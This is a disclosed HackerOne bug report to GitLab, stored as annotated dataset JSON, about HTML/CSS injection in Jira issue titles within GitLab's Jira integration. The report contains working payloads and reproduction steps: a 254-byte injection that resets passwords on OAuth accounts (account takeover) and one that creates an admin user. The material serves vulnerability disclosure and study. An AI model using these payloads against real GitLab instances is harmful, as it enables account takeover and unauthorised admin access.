{
  "reported_to": "GitLab",
  "reported_by": "joaxcar ",
  "title": "Content injection in Jira issue title enabling sending arbitrary POST request as victim",
  "content": "\nSummary\nThe issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.\nThis time it is the title field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.\nFor the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.\nBackground\nThere is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.\nGiving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue v-safe-html attribute.\nBut as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.\nIf you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js\nWhen a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js\nTo weaponize this, all we need is to first navigate away from the page to a server that just runs History.back() to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.\nThe payload\nI will present two payloads that will show the potential damage from this attack.\nThere exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.\nFirst of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example \"sign in with GitHub\". If the user does not actively go to /profile/password/edit and add a new password, the account is vulnerable to this attack. The password update page does not require \"current password\" before an initial password has been set. The payload looks like this\nCode 254 Bytes\n1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\nIf we pull this apart, we have\nCode 560 Bytes\n1<a \n2  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes\n3  class=js-feature-highlight <--- the classname to be used as a gadget\n4  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'\n5  ^--- The payload where the POST request will get sent\n6  >\n7.</a> <--- close the anchor tag\n8<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\n9  ^--- Unlimited styling to make the website a bulletproof click machine :)\nThis will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.\nWhen the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!\nThis payload will add a new administrator to the instance if an administrator visits the malicious page\nCode 251 Bytes\n1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\nPulled apart\nCode 257 Bytes\n1<a href=http:j15.se\n2  class=js-feature-highlight\n3  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>\n4.</a>\n5<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\nSteps to reproduce\nThis requires three things:\naccess to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)\na Jira server. I used a cloud Jira instance on atlassian.com\na third party account that is not registered on GitLab. ex a GitHub user\nPOC:\nCreate a user attacker\nLog in as attacker and create a group attack_group by visiting https://gitlab.com/groups/new (make sure the group have premium access)\nCreate a new project in the group called attack_proj\nGo to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit\nFollow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project\nLog in to Jira and create a task on the dashboard and name it <img src=#>\nGo to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue\nClick the issue to open the Issue details page. The title will render as a broken image. This proves the injection.\n<image_0>\nNow go back to Jira and create a new task and name it\nCode 254 Bytes\n1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\nGo back to the issue list and refresh to make sure it is created\nNow log in to GitLab.com with a third party provider, generating a new account on GitLab.com\n(if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)\nNow visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload\nA page will show up looking empty, click anywhere on the page\nThe page will flicker, and now when you hover over the page it will show a big blue button stating \"Got it!\". Click it\n<image_1>\nRefresh the page, you should now be logged out from GitLab.com\nLog in with the OAuth email and the password 12345678\nAccount takeover!\nImportant to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)\nImpact\nHTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.\nWhat is the current bug behavior?\nThe name/title field in the Jira issue page is not sanitized\nWhat is the expected correct behavior?\nThe name should be shown sanitized\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nAccount takeover and admin user creation through arbitrary POST request in Jira issue\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": 8690,
  "weaknesses": [
    "Resource Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2si9fdmpbzy9h5el71zxealg58n3?response-content-disposition=attachment%3B%20filename%3D%22img.jpg%22%3B%20filename%2A%3DUTF-8%27%27img.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T014504Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37e7b943ba67d3388a285b9d99541b2e8e743e21441adde03f819e20cf45c290",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gheics7j0d8s4lqijx9lj3hjy3q8?response-content-disposition=attachment%3B%20filename%3D%22gotit.jpg%22%3B%20filename%2A%3DUTF-8%27%27gotit.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T014504Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e3d0c100142be6be0eae4f323ba7fcba01088ad01e3d5f64107286c0d8da0eec"
  },
  "disclosed_date": 1663896720,
  "report_url": "https://hackerone.com/reports/1533976",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a Jira issue with a malicious HTML title containing a crafted payload that exploits the JavaScript gadget and browser caching behavior."
    ],
    [
      2,
      "Set up a GitLab project with Jira integration and have a victim user (with OAuth/SAML account) visit the malicious Jira issue page, click anywhere, and then click the 'Got it!' button to trigger the account takeover."
    ]
  ],
  "vuln_description": "The vulnerability involves HTML and CSS injection in the Jira issue title field within GitLab, which is not properly sanitized. This allows an attacker to craft a payload that, when clicked by a victim, sends arbitrary POST requests. The attack leverages JavaScript gadgets, browser caching quirks, and CSS manipulation to ensure the payload executes, leading to account takeover or admin user creation.",
  "reason": "This vulnerability requires understanding multiple complex components: HTML/CSS injection, JavaScript gadget exploitation, browser caching behavior, and GitLab's Jira integration. The attacker must also craft a payload within Jira's 255-character limit and ensure it triggers correctly through user interaction. The interaction between these components is subtle and non-obvious, requiring deep knowledge of both GitLab and browser behaviors.",
  "new_complexity": "VERY_HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "1409788",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves HTML and CSS injection in Jira issue titles within GitLab, leading to arbitrary POST requests. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application. However, this vulnerability relies on a combination of HTML/CSS injection, JavaScript gadgets, and browser behavior quirks that are not covered by the simple session/resource swapping approach. The detection method does not account for DOM-based vulnerabilities or injection attacks that bypass traditional authN/authZ checks.",
    "is_detectable": false
  }
}